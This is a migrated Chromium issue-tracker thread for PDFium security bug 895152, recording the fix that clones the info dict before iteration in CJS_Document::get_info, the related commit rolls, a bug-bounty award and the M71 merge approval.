### ts...@chromium.org (2018-10-15)

[Empty comment from Monorail migration]

### th...@chromium.org (2018-10-15)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>PDF]

### ts...@chromium.org (2018-10-15)

The aliasing of the info dict as part of a form is clever.  In addition to fixing this issue, we should probably not allow that if it can be avoided.

### bu...@chromium.org (2018-10-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5817b2f8c0d0e184e78bebb8b343688154df5856

commit 5817b2f8c0d0e184e78bebb8b343688154df5856
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Oct 16 03:36:14 2018

Roll src/third_party/pdfium 7c39bf7b87f8..1929d6e1d44e (16 commits)

https://pdfium.googlesource.com/pdfium.git/+log/7c39bf7b87f8..1929d6e1d44e


git log 7c39bf7b87f8..1929d6e1d44e --date=short --no-merges --format='%ad %ae %s'
2018-10-15 thestig@chromium.org Split pdfium_embeddertests sources.
2018-10-15 thestig@chromium.org Move fx_skia_device_unittest.cpp to pdfium_embeddertests.
2018-10-15 thestig@chromium.org Split pdfium_unittests sources.
2018-10-15 thestig@chromium.org Split public/ headers into their own source_set.
2018-10-15 thestig@chromium.org Restrict fxcrt's visibility to third_party.
2018-10-15 tsepez@chromium.org Clone dict before iteration in CJS_Document::get_info
2018-10-15 xlou@chromium.org Use CropBox instead of ArtBox or TrimBox
2018-10-15 tsepez@chromium.org Convert %s -> %ls for wide string error format.
2018-10-15 thestig@chromium.org Make core/ pass gn check.
2018-10-15 thestig@chromium.org Use more UnownedPtr in CPDF_FormControl.
2018-10-15 thestig@chromium.org Move CPDF_ModuleMgr methods into cpdf_modulemgr.cpp.
2018-10-15 thestig@chromium.org Make ":pdfium" pass gn check.
2018-10-15 tsepez@chromium.org Stop shadowing codec memory size with CCodec_ProgressiveDecoder::m_SrcSize
2018-10-15 thestig@chromium.org Make fxjs/ pass gn check.
2018-10-15 thestig@chromium.org Make fpdfsdk/ pass gn check.
2018-10-15 thestig@chromium.org Make xfa/ pass gn check.


Created with:
  gclient setdep -r src/third_party/pdfium@1929d6e1d44e

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.



BUG=chromium:895152,chromium:409670,chromium:895009
TBR=dsinclair@chromium.org

Change-Id: I95c8a745294172817f98cc2e21f0110bd5b978cf
Reviewed-on: https://chromium-review.googlesource.com/c/1282322
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#599835}
[modify] https://crrev.com/5817b2f8c0d0e184e78bebb8b343688154df5856/DEPS


### sh...@chromium.org (2018-10-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-16)

[Empty comment from Monorail migration]

### ts...@chromium.org (2018-10-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-17)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-10-30)

Hi chamal.desilva@, thanks for another great report. The VRP panel decided to award $5,000 for this one. Cheers!

### aw...@google.com (2018-10-31)

[Empty comment from Monorail migration]

### ts...@chromium.org (2018-11-26)

[Empty comment from Monorail migration]

### ts...@chromium.org (2018-11-26)

[Empty comment from Monorail migration]

### aw...@google.com (2018-12-04)

[Empty comment from Monorail migration]

### mm...@chromium.org (2018-12-06)

[Empty comment from Monorail migration]

### th...@chromium.org (2018-12-07)

awhalley: Per comment on https://crbug.com/chromium/908292, we need to merge.

### th...@chromium.org (2018-12-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-07)

This bug requires manual review: Request affecting a post-stable build
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-12-07)

awhallye@ for M71 merge review.

### th...@chromium.org (2018-12-14)

awhalley: ping

### aw...@google.com (2018-12-14)

Thanks for the ping. This change now has beta coverage; good for speculative merge to 71 in case there's another respin.

### go...@chromium.org (2018-12-14)

Approving merge to M71 branch 3578 based on https://crbug.com/chromium/895152#c23. At the moment there is not plan for M71 respin unless extremely critical issue arise.

### th...@chromium.org (2018-12-14)

Thanks. M71 merge in progress: https://pdfium-review.googlesource.com/47333

### bu...@chromium.org (2018-12-14)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/2ebef1487e139dfe1f44998f312ed59f80202c82

commit 2ebef1487e139dfe1f44998f312ed59f80202c82
Author: Lei Zhang <thestig@chromium.org>
Date: Fri Dec 14 22:13:14 2018

M71: Clone dict before iteration in CJS_Document::get_info

Bug: chromium:895152
TBR=tsepez@chromium.org
Change-Id: I678350841892f88a5d580b58a33a639a1b6ec305
Reviewed-on: https://pdfium-review.googlesource.com/c/44050
Reviewed-by: Lei Zhang <thestig@chromium.org>
Commit-Queue: Tom Sepez <tsepez@chromium.org>
(cherry picked from commit d2e27d660a96080882e43825fb4b5d03e8a4d05a)
Reviewed-on: https://pdfium-review.googlesource.com/c/47333
Reviewed-by: Tom Sepez <tsepez@chromium.org>

[add] https://crrev.com/2ebef1487e139dfe1f44998f312ed59f80202c82/testing/resources/javascript/bug_895152_expected.txt
[modify] https://crrev.com/2ebef1487e139dfe1f44998f312ed59f80202c82/fxjs/cjs_document.cpp
[add] https://crrev.com/2ebef1487e139dfe1f44998f312ed59f80202c82/testing/resources/javascript/bug_895152.in


### th...@chromium.org (2018-12-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2019-01-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-01-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-02-19)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/895152?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/908292, crbug.com/chromium/908295, crbug.com/chromium/912469]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092698)*
